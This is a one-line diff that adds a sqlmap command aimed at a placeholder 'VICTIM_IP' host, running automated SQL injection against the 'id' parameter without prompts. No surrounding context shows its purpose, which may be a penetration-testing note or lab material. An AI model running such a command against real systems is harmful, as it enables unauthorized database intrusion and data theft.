@@ -1,0 +1,1 @@
+sqlmap -u "http://VICTIM_IP/?id=*" -p id --batch
